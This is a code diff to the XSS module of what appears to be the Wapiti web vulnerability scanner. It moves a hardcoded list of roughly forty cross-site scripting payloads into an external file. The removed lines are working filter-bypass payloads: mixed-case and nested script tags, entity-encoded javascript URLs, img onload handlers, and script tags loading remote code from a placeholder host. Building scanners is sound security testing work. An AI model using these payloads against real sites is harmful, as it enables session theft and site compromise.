@@ -23,53 +23,7 @@ class XSSAttack(Attack):
   # content of a tag (text node like beetween <p> and </p>)
   # only trick here must be on character encoding, filter bypassing, stuff like that
   # form the simplest to the most complex, Wapiti will stop on the first working
-  independant_payloads=[
-      "<script>alert('__XSS__')</script>",
-      "<script>alert(\"__XSS__\")</script>",
-      "<ScRiPt>alert('__XSS__')</sCrIpT>", # stupid case-sensitive filter on <script>
-      "<ScRiPt>alert(\"__XSS__\")</sCrIpT>",
-      "<script>String.fromCharCode(0,__XSS__,1)</script>",
-      "<ScRiPt>String.fromCharCode(0,__XSS__,1)</sCrIpT>",
-      "<script src=http://__XSS__/x.js></script>", # simple but can be effetive
-      "<ScRiPt src=http://__XSS__/x.js></sCrIpT>",
-
-      "<img src=javascript:alert('__XSS__') />", # no script, no problem :p
-      "<img src=javascript:alert(\"__XSS__\") />",
-      "<img src=javascript:String.fromCharCode(0,__XSS__,1) />",
-      "<img src=JaVaScRiPt:String.fromCharCode(0,__XSS__,1) />",
-      "<img src=JaVaS\tcRiPt:String.fromCharCode(0,__XSS__,1) />",
-      "<img src=jav&#x09;ascript:alert('__XSS__'); />",
-      "<img src=jav&#x09;ascript:alert(\"__XSS__\"); />",
-      "<img src=validimg.png onload=alert(\"__XSS__\") />",
-      "<img src=validimg.png onload=alert('__XSS__') />",
-      "<img src=validimg.png onload:String.fromCharCode(0,__XSS__,1) />",
-
-      # for masturbating monkeys only
-      "<img src=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;__XSS__;&#39;&#41; />",
-      "<img src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27__XSS__&#x27&#x29 />",
-
-      "<script >alert('__XSS__')</script >", # yet another stupid bypass on <script>
-      "<script >alert(\"__XSS__\")</script >",
-      "<script >String.fromCharCode(0,__XSS__,1)</script >",
-      "<ScRiPt >String.fromCharCode(0,__XSS__,1)</ sCrIpT>",
-      "<script/>alert('__XSS__')</script/>", # yup it works
-      "<script/>alert(\"__XSS__\")</script/>",
-      "<ScRiPt/>alert('__XSS__')</sCrIpT/>",
-      "<ScRiPt/>alert(\"__XSS__\")</sCrIpT/>",
-      "<script/ src=http://__XSS__/x.js></script/>",
-      "<ScRiPt/ src=http://__XSS__/x.js></sCrIpT/>",
-      "<scr<script>ipt>alert('__XSS__')</script>", # stupid <script> remove
-      "<scr<script>ipt>alert('__XSS__')</scr</script>ipt>", # and </script>
-      "<scr<script>ipt>alert(\"__XSS__\")</script>",
-      "<scr<script>ipt>alert(\"__XSS__\")</scr</script>ipt>", # and </script>
-      "<scr<script>ipt>String.fromCharCode(0,__XSS__,1)</script>",
-      "<scr<script>ipt>String.fromCharCode(0,__XSS__,1)</scr</script>ipt>",
-      "<scr<script>ipt src=http://__XSS__/x.js></script>",
-      "<scr<script>ipt src=http://__XSS__/x.js></scr</script>ipt>",
-      "<object><param name=x value=javascript:alert('__XSS__')></object>",
-      "<object><param name=x value=javascript:alert(\"__XSS__\")></object>",
-      "<object><param name=x value=javascript:String.fromCharCode(0,__XSS__,1)></object>"
-      ]
+  independant_payloads = []
 
   xss_history={} # will be removed later
   HTTP=None
@@ -78,11 +32,11 @@ class XSSAttack(Attack):
   GET_XSS={}
   POST_XSS={}
 
-  color=0
-  verbose=0
+  CONFIG_FILE = "xssPayloads.txt"
 
   def __init__(self,HTTP,xmlRepGenerator):
     Attack.__init__(self,HTTP,xmlRepGenerator)
+    self.independant_payloads = self.loadPayloads(self.CONFIG_DIR+"/"+self.CONFIG_FILE)
 
   def attackGET(self,page,dict,attackedGET):
     # page est l'url de script
